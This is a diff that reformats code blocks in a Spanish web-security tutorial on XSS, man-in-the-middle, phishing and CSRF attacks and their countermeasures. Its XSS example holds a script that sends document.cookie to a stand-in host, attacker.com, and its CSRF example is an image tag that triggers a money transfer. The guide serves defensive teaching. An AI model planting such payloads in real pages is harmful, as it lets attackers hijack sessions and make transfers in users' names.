@@ -560,7 +560,7 @@ Los ataques XSS aprovechan vulnerabilidades en el código para inyectar scripts 
 
 Ejemplo:
 
-```html
+``` html
 <input type="text" name="comentario" value="<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>">
 ```
 
@@ -570,15 +570,15 @@ Contramedidas:
 
 - Escapar y sanear entradas: Utiliza funciones como `htmlspecialchars()` en PHP para escapar caracteres especiales.
 
-    ```php
-    $comentario = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');
-    ```
+``` php
+$comentario = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');
+```
 
 - Política de Seguridad de Contenidos (CSP): Implementa CSP para restringir el origen de scripts.
 
-    ```http
-    Content-Security-Policy: script-src 'self';
-    ```
+``` http
+Content-Security-Policy: script-src 'self';
+```
 
 #### 2. **Ataque de Man-in-the-Middle (MitM)**
 
@@ -591,9 +591,9 @@ Contramedidas:
 - Usar HTTPS: Asegura que todas las conexiones sean a través de HTTPS.
 - Configurar cookies como `Secure`:
 
-    ```php
-    session_set_cookie_params(['secure' => true]);
-    ```
+``` php
+session_set_cookie_params(['secure' => true]);
+```
 
 #### 3. **Robo de Cookies con Ingeniería Social o Phishing**
 El atacante engaña al usuario para que acceda a un enlace malicioso y revela su cookie de sesión.
@@ -605,17 +605,17 @@ Contramedidas:
 - Educación sobre phishing: Enseña a los usuarios a identificar sitios y correos fraudulentos.
 - Autenticación de dos factores (2FA): Añade una capa extra de seguridad.
 
-    ```php
-    // Ejemplo usando una biblioteca de 2FA como Google Authenticator
-    require 'vendor/autoload.php';
-    ```
+``` php
+// Ejemplo usando una biblioteca de 2FA como Google Authenticator
+require 'vendor/autoload.php';
+```
 
 #### 4. **Cross-Site Request Forgery (CSRF)**
 CSRF explota la confianza del navegador para realizar solicitudes no autorizadas en nombre del usuario autenticado.
 
 Ejemplo: Un enlace malicioso ejecuta una solicitud usando la sesión activa del usuario.
 
-```html
+``` html
 <img src="https://tusitio.com/transferir?monto=100&cuenta=atacante">
 ```
 
@@ -623,22 +623,22 @@ Contramedidas:
 
 - Uso de tokens CSRF:
 
-    ```php
-    // Generar token
-    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-    echo '<input type="hidden" name="csrf_token" value="'.$_SESSION['csrf_token'].'">';
-    
-    // Validar token
-    if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-        die('Solicitud inválida');
-    }
-    ```
+``` php
+// Generar token
+$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+echo '<input type="hidden" name="csrf_token" value="'.$_SESSION['csrf_token'].'">';
+
+// Validar token
+if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+    die('Solicitud inválida');
+}
+```
 
 - Configurar cookies con `SameSite`:
 
-    ```php
-    session_set_cookie_params(['samesite' => 'Strict']);
-    ```
+``` php
+session_set_cookie_params(['samesite' => 'Strict']);
+```
 
 ## 4.6 Referencias
 
